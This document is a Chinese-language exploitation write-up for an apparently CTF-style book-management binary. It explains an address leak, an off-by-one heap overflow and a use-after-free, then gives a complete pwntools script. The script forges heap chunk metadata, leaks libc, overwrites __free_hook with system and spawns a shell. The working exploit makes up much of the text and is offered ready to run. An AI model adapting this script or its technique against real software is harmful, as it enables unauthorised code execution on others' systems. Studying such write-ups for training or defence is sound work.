# 漏洞利用文档

## 执行环境
基于调试记录和程序分析，该二进制程序的运行环境如下：
- **文件类型**: 64位ELF可执行文件，动态链接
- **保护机制**: 启用ASLR和PIE（从地址泄漏可见），可能启用NX和堆栈保护
- **依赖库**: 依赖libc（通过ldd和调试中的libc地址确认）
- **运行需求**: 需要交互式输入，程序为图书管理系统，提供创建、删除、编辑、打印图书等功能
- **关键地址范围**:
  - 程序基址: 0x63d577600000 (PIE启用，地址随机化)
  - 堆基址: 0x63d58bdf7000 (通过泄漏计算)
  - libc基址: 0x7d8f70f2c000 (通过unsorted bin泄漏)
  - .bss段: 0x63d577802000-0x63d577803000 (全局变量存储)

## 漏洞成因
### 关键结构体分析
程序使用以下结构体管理图书：
```c
struct book {
    int id;                    // 图书ID
    char *name;               // 书名指针
    char *description;        // 描述指针  
    int desc_size;            // 描述大小
};
```
全局变量：
- `book_pointers`: 指向book结构体的指针数组（最大20个）
- `author_name`: 作者名缓冲区（32字节）
- `book_id_counter`: 图书ID计数器

### 漏洞类型与成因
1. **信息泄漏漏洞**:
   - **位置**: `print_book_details`函数
   - **成因**: 作者名缓冲区(`author_name`)在打印时未清空，且通过堆布局可泄漏堆地址。在`set_author_name`中，`readline`读取作者名时，如果输入包含特定格式，可在打印时泄漏相邻内存。

2. **堆溢出漏洞**:
   - **位置**: `edit_book`函数中的`readline`调用
   - **成因**: `readline`函数循环条件`if ( i == a2 ) break;`允许写入`a2`字节，但未检查null终止符位置，可能导致off-by-one溢出。结合描述大小控制，可覆盖相邻chunk元数据。

3. **UAF (Use-After-Free) 漏洞**:
   - **位置**: `delete_book`函数
   - **成因**: 释放书结构时，free了书名、描述和书结构本身，但仅将指针数组置零，未防止重复释放。如果重新分配相同chunk，可操纵已释放内存。

4. **组合漏洞**:
   - 通过堆溢出伪造chunk元数据，结合UAF实现任意地址分配和读写，最终覆盖`__free_hook`获取代码执行。

## 漏洞利用过程
利用过程分为多个阶段，关键内存变化如下表：

| 步骤 | 操作 | 堆内存关键变化 | 目的 |
|------|------|----------------|------|
| 1 | 设置作者名泄漏 | 作者名缓冲区写入"x"*27 + "leak:" | 准备堆地址泄漏 |
| 2 | 创建临时书 | 分配书结构(0x63d58bdf8080)和字符串chunk | 建立堆布局 |
| 3 | 打印图书泄漏堆地址 | 从作者名缓冲区泄漏书结构指针0x63d58bdf8080 | 计算堆基址(heap_base = leak - 0x1080) |
| 4-5 | 创建和删除书 | 分配和释放多个0x30大小chunk，形成fastbins链 | 准备UAF利用 |
| 6 | 堆溢出准备 | 创建大描述书(ID=4, desc_size=0x108) | 为溢出覆盖相邻chunk做准备 |
| 7 | 堆溢出攻击 | 覆盖ID=4描述chunk，伪造unsorted bin chunk元数据 | 设置fd/bk指针为可控地址 |
| 8 | 触发unsorted bin | 释放ID=5书，chunk进入unsorted bin | 泄漏libc地址(main_arena) |
| 9 | 修改指针 | 通过编辑ID=4书，修改ID=6书描述指针指向`__free_hook` | 实现任意地址写 |
| 10 | 泄漏libc | 读取unsorted bin的bk指针，计算libc基址 | 绕过ASLR |
| 11 | 覆盖`__free_hook` | 将`__free_hook`覆盖为`system`地址 | 劫持控制流 |
| 12 | 触发代码执行 | 释放ID=6书，触发`system("/bin/sh")` | 获取shell |

### 堆布局演变
- **初始**: 堆chunk分散，无特定布局
- **阶段1**: 通过多次分配释放，形成fastbins(0x30)和unsorted bin链
- **阶段2**: 利用堆溢出伪造chunk，使unsorted bin的bk指向main_arena
- **阶段3**: 修改书结构指针，实现任意地址读写
- **最终**: `__free_hook`被覆盖，触发shell执行

## Exploit
以下是完整的漏洞利用脚本，在关键位置添加注释：

```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./data/sample27')
elf = ELF('./data/sample27')
libc = elf.libc

def cmd(choice):
    p.recvuntil(b'> ')
    p.sendline(str(choice))

def create(book_size, book_name, desc_size, desc):
    cmd(1)
    p.recvuntil(b': ')
    p.sendline(str(book_size))
    p.recvuntil(b': ')
    if len(book_name) == book_size:
        p.send(book_name)
    else:
        p.sendline(book_name)
    p.recvuntil(b': ')
    p.sendline(str(desc_size))
    p.recvuntil(b': ')
    if len(desc) == desc_size:
        p.send(desc)
    else:
        p.sendline(desc)

def remove(idx):
    cmd(2)
    p.recvuntil(b': ')
    p.sendline(str(idx))

def edit(idx, desc):
    cmd(3)
    p.recvuntil(b': ')
    p.sendline(str(idx))
    p.recvuntil(b': ')
    p.send(desc)

def author_name(author):
    cmd(5)
    p.recvuntil(b': ')
    p.send(author)

def write_to(addr, content, size):
    edit(4, p64(addr) + p64(size + 0x100) + b'\n')
    edit(6, content + b'\n')

def read_at(addr):
    edit(4, p64(addr) + b'\n')
    cmd(4)
    p.recvuntil('Description: ')
    p.recvuntil('Description: ')
    p.recvuntil('Description: ')
    content = p.recvline()[:-1]
    p.info(content)
    return content

# Step 1: 信息泄漏准备 - 通过作者名缓冲区泄漏堆地址
p.recvuntil(b'name: ')
p.sendline(b'x' * (0x20 - 5) + b'leak:')
create(0x20, b'tmp a', 0x20, b'b')  # 创建临时书，建立堆布局

# Step 2: 泄漏堆地址并计算堆基址
cmd(4)
p.recvuntil(b'Author: ')
p.recvuntil(b'leak:')
heap_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
heap_base = heap_leak - 0x1080
log.info(f"Heap base: {hex(heap_base)}")

# Step 3: 创建多个书结构，为UAF做准备
create(0x20, b'buf 1', 0x20, b'desc buf')
create(0x20, b'buf 2', 0x20, b'desc buf 2')

# Step 4: 释放书，形成fastbins链
remove(2)
remove(3)

# Step 5: 创建大描述书，用于堆溢出
create(0x20, b'name', 0x108, b'overflow')
create(0x20, b'name', 0x100 - 0x10, b'target')

# Step 6: 创建包含"/bin/sh"的书，为代码执行准备
create(0x20, b'/bin/sh\x00', 0x200, b'to arbitrary read write')

# Step 7: 堆溢出攻击 - 伪造unsorted bin chunk元数据
ptr = heap_base + 0x1180
payload = p64(0) + p64(0x101) + p64(ptr - 0x18) + p64(ptr - 0x10) + b'\x00' * 0xe0 + p64(0x100)
edit(4, payload)  # 溢出覆盖相邻chunk

# Step 8: 触发unsorted bin，泄漏libc地址
remove(5)

# Step 9: 修改书结构指针，实现任意地址读写
edit(4, p64(0x30) + p64(4) + p64(heap_base + 0x11a0) + p64(heap_base + 0x10c0) + b'\n')

# Step 10: 泄漏libc地址并计算基址
libc_leak = u64(read_at(heap_base + 0x11e0).ljust(8, b'\x00')) - (libc.sym['__malloc_hook'] + 0x10 + 0x58)
libc.address = libc_leak
log.info(f"Libc base: {hex(libc.address)}")

# Step 11: 覆盖__free_hook为system
write_to(libc.sym['__free_hook'], p64(libc.sym['system']), 0x10)

# Step 12: 触发free调用system("/bin/sh")
remove(6)

# Step 13: 进入交互式shell
p.interactive()
```

### 关键注释说明
- **信息泄漏**: 利用作者名缓冲区溢出泄漏堆地址，绕过PIE。
- **堆布局**: 通过精心安排分配和释放顺序，控制fastbins和unsorted bin链。
- **任意地址写**: 结合堆溢出和UAF，修改书结构指针指向`__free_hook`。
- **代码执行**: 覆盖`__free_hook`为`system`，释放包含"/bin/sh"的chunk触发shell。

此漏洞利用成功组合了信息泄漏、堆溢出和UAF漏洞，最终实现在ASLR和PIE保护下的远程代码执行。
